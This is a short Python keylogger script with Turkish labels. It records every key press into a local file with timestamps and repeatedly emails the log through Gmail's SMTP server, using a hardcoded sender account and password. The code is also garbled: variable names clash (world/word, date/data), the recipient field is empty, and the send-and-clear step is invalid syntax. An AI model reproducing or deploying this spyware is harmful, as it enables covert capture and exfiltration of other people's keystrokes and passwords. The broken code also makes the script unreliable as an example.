import keyboard  
import datetime  
import smtplib
from email.mime.text import MIMEText
import time

world = ""
interval = 20

dosya = open("key_log.txt","w")

def on_press(key):
    global world
    if key.name in ["space","enter"]:
        with open("key_log.txt","a") as file:
            file.write(word + "" + "Girilme Tarihi= " +str(datetime.datetime.now())+ "\n" )
            world= ""
    elif key.name == "backspace":
        world = world [:-1]
    else:
        world +=key.name
        
        keyboard.on_press(on_press)

while True:
    with open("key_log.txt") as file:
        date = file.read ()
        
        if data:
            msg = MIMEText(data)
            msg["Subject"] = "KeyLogger Data"
            msg["From"] = "gedikli.egitim@gmail.com"
            msg["To"] = 
            
            mail = smtplib.SMTP('smtp.gmail.com',587)
            mail.ehlo()
            mail.starttls()
            mail.login ('gedikli.egitim@gmail.com', 'fsffsdfsdfdfs')
            mail.send_message ("key.log.txt","w") as file:
                file.write("")
                time.sleep(interval)